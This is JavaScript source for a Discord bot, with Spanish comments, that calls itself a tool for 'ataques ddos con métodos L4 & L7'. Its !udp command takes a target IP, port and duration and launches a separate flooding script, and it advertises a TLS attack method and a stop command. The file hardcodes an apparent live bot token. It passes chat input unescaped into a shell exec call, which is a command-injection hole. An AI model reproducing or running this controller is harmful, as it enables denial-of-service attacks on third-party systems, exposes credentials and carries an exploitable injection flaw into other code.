
const { Client, GatewayIntentBits, Partials, EmbedBuilder } = require('discord.js');
const { exec } = require('child_process');
const fs = require('fs');
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

let udpAttackProcess; // Variable para almacenar el proceso del ataque UDP
let tlsAttackProcess; // Variable para almacenar el proceso del ataque TLS

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
    partials: [Partials.Channel],
});

// Función para crear un embed
const createEmbed = (title, description, color = '#FF0000') => {
    return new EmbedBuilder()
        .setTitle(title)
        .setDescription(description)
        .setColor(color);
};

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

// Función para leer proxies desde un archivo
function readProxies(file) {
    const proxies = fs.readFileSync(file, 'utf-8').trim().split('\n');
    return proxies.map(proxy => {
        const [ip, port] = proxy.split(':');
        return { ip, port: parseInt(port, 10) };
    });
}

// Función para seleccionar un proxy aleatorio
function getRandomProxy(proxies) {
    const randomIndex = Math.floor(Math.random() * proxies.length);
    return proxies[randomIndex];
}

// Comando para ataque UDP
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('!udp')) {
        const args = message.content.split(' ');
        const ip = args[1]; // IP objetivo
        const port = args[2]; // Puerto objetivo
        const time = args[3]; // Tiempo de ataque

        if (!ip || !port || !time) {
            return message.channel.send(createEmbed('❌ Error', 'Por favor proporciona IP, puerto y el tiempo del ataque. Ejemplo: `!udp 1.1.1.1 5000 60`'));
        }

        if (tlsAttackProcess || udpAttackProcess) {
            return message.channel.send(createEmbed('⚠️ Error', 'Ya hay un ataque en curso. Por favor detén el ataque actual antes de iniciar uno nuevo.'));
        }

        const embed = createEmbed('🚀 Ataque UDP Iniciado', `**IP:** ${ip}\n**Puerto:** ${port}\n**Tiempo:** ${time} segundos\n**Método:** UDP\n**Atacado por:** ${message.author.tag}`);
        await message.channel.send({ embeds: [embed] });

        // Leer proxies del archivo por defecto
        const proxiesFile = 'proxies.txt'; // Archivo de proxies por defecto
        const proxies = readProxies(proxiesFile);

        // Ejecutar el script de ataque UDP
        udpAttackProcess = exec(`node udp.js ${ip} ${port} ${time}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error al ejecutar el script UDP: ${error.message}`);
                message.channel.send(createEmbed('❌ Error', 'Hubo un error al ejecutar el ataque UDP.'));
                udpAttackProcess = null;
                return;
            }
            if (stderr) {
                console.error(`Error en stderr: ${stderr}`);
                message.channel.send(createEmbed('❌ Error', 'Error en la ejecución del ataque UDP.'));
                udpAttackProcess = null;
                return;
            }
            console.log(`Resultado del ataque UDP: ${stdout}`);
            udpAttackProcess = null;
        });
    }

    // Comando para detener ataques
    if (message.content === '!stop') {
        if (tlsAttackProcess) {
            tlsAttackProcess.kill();
            tlsAttackProcess = null;
            message.channel.send(createEmbed('🛑 Detenido', 'El ataque TLS ha sido detenido.'));
        } else if (udpAttackProcess) {
            udpAttackProcess.kill();
            udpAttackProcess = null;
            message.channel.send(createEmbed('🛑 Detenido', 'El ataque UDP ha sido detenido.'));
        } else {
            message.channel.send(createEmbed('ℹ️ Información', 'No hay un ataque en curso para detener.'));
        }
    }

    // Comando para métodos
    if (message.content === '!methods') {
        const methodsEmbed = createEmbed('📋 Métodos Disponibles', '**Comandos:**\n`!tls <url> <tiempo>`: Inicia un ataque TLS.\n`!udp <ip> <puerto> <tiempo>`: Inicia un ataque UDP.\n`!stop`: Detiene el ataque en curso.');
        await message.channel.send({ embeds: [methodsEmbed] });
    }

    // Comando de ayuda
    if (message.content === '!help') {
        const helpEmbed = createEmbed('🆘 Ayuda', '**Comandos:**\n`!methods`: Muestra los métodos disponibles.\n`!help`: Muestra esta ayuda.\n`!infoBot`: Información sobre el bot.\n`!reset`: Reinicia el bot (solo para administradores).');
        await message.channel.send({ embeds: [helpEmbed] });
    }

    // Comando para información del bot
    if (message.content === '!infoBot') {
        const infoEmbed = createEmbed('🤖 Información del Bot', '**Nombre del Bot:** ' + client.user.tag + '\n**ID del Bot:** ' + client.user.id + '\n**Versión:** 1.0\n**Creador:** Saturai X Engine\n**Descripción:** Este bot permite realizar ataques ddos con métodos L4 & L7.');
        await message.channel.send({ embeds: [infoEmbed] });
    }

    // Comando para reiniciar el bot (solo para administradores)
    if (message.content === '!reset') {
        if (!message.member.permissions.has('ADMINISTRATOR')) {
            return message.channel.send(createEmbed('🚫 Acceso Denegado', 'No tienes permisos suficientes para usar este comando.'));
        }

        message.channel.send(createEmbed('🔄 Reiniciando Bot', 'El bot se reiniciará en 5 segundos...')).then(() => {
            setTimeout(() => {
                client.destroy(); // Desconecta el bot
                client.login('MTI3NTUyNjQxMzk2NDkzOTMyNQ.GdNmjA.ZmJCVwIBTU2sEJMJk46vHjk7D_lMtcyPtusQOE'); // Reinicia el bot
            }, 5000);
        });
    }
});

// Inicia el bot con el token
client.login('MTI3NTUyNjQxMzk2NDkzOTMyNQ.GdNmjA.ZmJCVwIBTU2sEJMJk46vHjk7D_lMtcyPtusQOE');